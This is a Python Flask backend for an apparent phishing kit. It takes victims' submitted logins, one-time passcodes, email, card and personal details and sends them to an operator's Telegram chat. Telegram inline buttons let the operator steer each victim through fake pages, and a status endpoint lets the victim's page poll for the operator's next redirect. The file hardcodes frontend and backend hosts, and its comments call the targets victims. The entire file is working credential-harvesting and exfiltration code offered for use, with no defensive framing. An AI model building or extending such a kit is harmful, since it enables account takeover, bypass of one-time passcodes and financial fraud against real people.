from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import time
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

SESSION_STATUS = {}

# IMPORTANT: Change this to your actual frontend domain / Render URL
# Do NOT use localhost or 127.0.0.1 here
FRONTEND_BASE_URL = "https://ms-bandy.vercel.app"   # ← UPDATE THIS

PAGES = [
    {"emoji": "🔐", "text": "LOGIN1",   "page": "index.html"},
    {"emoji": "🔢", "text": "OTP",      "page": "otp.html"},
    {"emoji": "📧", "text": "EMAIL",    "page": "email.html"},
    {"emoji": "🧾", "text": "C",        "page": "c.html"},
    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
    {"emoji": "🔑", "text": "LOGIN2",   "page": "login2.html"},
    {"emoji": "🎉", "text": "THANK YOU","page": "thnks.html"},
]

def set_webhook():
    webhook_url = "https://ms-bcknd.onrender.com/webhook"  # your backend URL
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    try:
        response = requests.get(url)
        print("Webhook set response:", response.json())
        return response.json()
    except Exception as e:
        print("Failed to set webhook:", str(e))
        return {"ok": False, "error": str(e)}

def send_to_telegram(data, session_id, type_):
    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
            for subkey, subvalue in value.items():
                msg += f" <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
        else:
            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
    msg += f"\n<b>Session ID:</b> <code>{session_id}</code>"

    # Build inline keyboard with callback_data
    inline_keyboard = [[
        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
    ] for b in PAGES]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": inline_keyboard}
    }

    for attempt in range(3):
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json=payload
            )
            print("Telegram sent:", r.status_code, r.json())
            return r.ok
        except Exception as e:
            print(f"Telegram attempt {attempt + 1} failed:", str(e))
            time.sleep(2 ** attempt)
    return False

# ────────────────────────────────────────────────
#               YOUR EXISTING /login, /otp, etc.
# ────────────────────────────────────────────────
# (keep them exactly as they are — no change needed there)

@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()
    print("Webhook received:", update)

    if not update or "callback_query" not in update:
        print("No callback_query in update")
        return jsonify({"status": "ignored"}), 200

    try:
        callback_query = update["callback_query"]
        data = callback_query["data"]
        print("Callback data:", data)

        session_id, page = data.split(":", 1)  # split only on first :

        if session_id not in SESSION_STATUS:
            print("Unknown session:", session_id)
            return jsonify({"status": "unknown session"}), 404

        # Build the full URL to open
        # If page already has https://, use it directly (for external links if you ever add them)
        if page.startswith("http://") or page.startswith("https://"):
            redirect_url = page
        else:
            redirect_url = f"{FRONTEND_BASE_URL}/{page.lstrip('/')}"

        print(f"Approver clicked → redirecting to: {redirect_url}")

        # Tell Telegram to open this URL for the user who clicked the button
        answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
        answer_payload = {
            "callback_query_id": callback_query["id"],
            "url": redirect_url,          # ← This is what makes the redirect happen
            "cache_time": 0
        }
        resp = requests.post(answer_url, json=answer_payload)
        print("answerCallbackQuery response:", resp.status_code, resp.text)

        # Optionally mark session as approved (useful if victim is still polling)
        SESSION_STATUS[session_id]["approved"] = True
        SESSION_STATUS[session_id]["redirect_url"] = redirect_url

        return jsonify({"status": "ok"}), 200

    except ValueError:
        print("Invalid callback data format:", data)
        return jsonify({"status": "invalid format"}), 400
    except Exception as e:
        print("Webhook error:", str(e))
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route("/status/<session_id>", methods=["GET"])
def status(session_id):
    session = SESSION_STATUS.get(session_id)
    if not session:
        print("Status error: Session not found:", session_id)
        return jsonify({"error": "Not found"}), 404

    print("Status checked:", session_id, session)

    if session["approved"]:
        return jsonify({
            "status": "approved",
            "redirect_url": session.get("redirect_url")
        }), 200

    return jsonify({"status": "pending"}), 200

@app.route("/", methods=["GET"])
def home():
    return "✅ Server is live"

if __name__ == "__main__":
    set_webhook()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
